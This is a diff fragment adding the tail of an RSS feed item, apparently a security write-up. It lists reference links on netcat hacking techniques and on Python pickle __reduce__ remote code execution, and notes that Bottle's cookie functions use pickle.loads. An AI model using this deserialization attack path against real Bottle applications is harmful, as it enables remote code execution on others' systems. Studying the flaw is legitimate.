+&lt;p>&lt;a href="https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/" target="_blank" rel="noopener">https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/&lt;/a>&lt;/p>
+&lt;p>Python Pickle Module &lt;code>__reduce__&lt;/code> implements allow RCE:&lt;/p>
+&lt;p>&lt;a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" target="_blank" rel="noopener">https://davidhamann.de/2020/04/05/exploiting-python-pickle/&lt;/a>&lt;/p>
+&lt;p>Python Bottle get_cookie set_cookie using pickle.loads and pickle.dumps in its chain of encrypt/encode steps&lt;/p>
+&lt;p>&lt;a href="https://github.com/bottlepy/bottle/blob/master/bottle.py" target="_blank" rel="noopener">https://github.com/bottlepy/bottle/blob/master/bottle.py&lt;/a> (ctrl+f set_cookie, get_cookie)&lt;/p></description></item></channel></rss>
